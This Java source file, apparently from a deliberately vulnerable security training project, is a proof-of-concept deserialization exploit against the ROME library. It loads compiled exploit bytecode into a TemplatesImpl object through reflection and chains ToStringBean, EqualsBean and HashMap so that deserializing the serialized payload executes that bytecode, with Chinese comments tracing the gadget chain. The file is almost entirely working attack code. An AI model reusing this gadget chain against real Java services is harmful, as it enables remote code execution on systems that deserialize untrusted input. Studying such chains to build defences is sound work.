package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;


import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.tomcat.util.codec.binary.Base64;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;


//@SuppressWarnings("all")
public class ROME_PocTest {

    // 获取项目根目录，设置expPath;
    private static String projectRoot = System.getProperty("user.dir");
    private static String expPath = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\RomeDeserialize\\ROME_Poc.ser";

    // 反射修改 Field 方法；
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    // 序列化
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(expPath));
        objectOutputStream.writeObject(obj);
    }

    // 反序列化
    public static Object deserialize(String filePath) throws IOException, ClassNotFoundException {
        // ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(filePath)));
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
        return objectInputStream.readObject();
    }


    /**
     * 第1步：测试 ToStringBean.toString(String) --> TemplatesImpl.getOutputProperties() --> TemplatesImpl.newTransformer() --> TemplatesImpl.getTransletInstance() --> TemplatesImpl.newInstance();
     *
     *  * TemplatesImpl.getOutputProperties()
     *  * ToStringBean.toString(String)
     *  * ToStringBean.toString()
     *
     * @throws Exception
     */
    public static void rome_toString() throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        // 获取项目根目录
        String projectRoot = System.getProperty("user.dir");
        String expPath = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\Exploit\\TemplatesImpl_Exploit.class";
        System.out.println(expPath + "\n");

        // 获取exp字节码
        byte[] bytecodes = Files.readAllBytes(Paths.get(expPath));
        String base64String = new String(Base64.encodeBase64(bytecodes));
        System.out.println(base64String + "\n");

        // 修改属性值
        setFieldValue(templatesimpl, "_name", "PocTest");
        setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
        setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 Templates.class 接口的原因，是因为其只有一个方法，保证能够触发 getOutputProperties() 方法；
//        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
//        new ToStringBean(Templates.class, templatesimpl).toString();
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
        toStringBean.toString();

        // 打印测试结束
        System.out.println("测试结束！ \n");
    }


    /**
     * 第2步：测试完整POC利用链；
     *
     *  * TemplatesImpl.getOutputProperties()
     *  * ToStringBean.toString(String)
     *  * ToStringBean.toString()
     *  * EqualsBean.beanHashCode()
     *  * EqualsBean.hashCode()
     *  * HashMap<K,V>.hash(Object)
     *  * HashMap<K,V>.readObject(ObjectInputStream)
     *
     * @throws Exception
     */
    public static void rome_hashcode_toString() throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        String projectRoot = System.getProperty("user.dir");
        String expPath = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\Exploit\\TemplatesImpl_Exploit.class";

        byte[] bytecodes = Files.readAllBytes(Paths.get(expPath));

        setFieldValue(templatesimpl, "_name", "PocTest");
        setFieldValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
        setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "rome");

        // 序列化
        serialize(hashMap);

        // 反序列化
        deserialize(expPath);
    }


    public static void main(String[] args) throws Exception {
//        rome_toString();
        rome_hashcode_toString();
    }

}
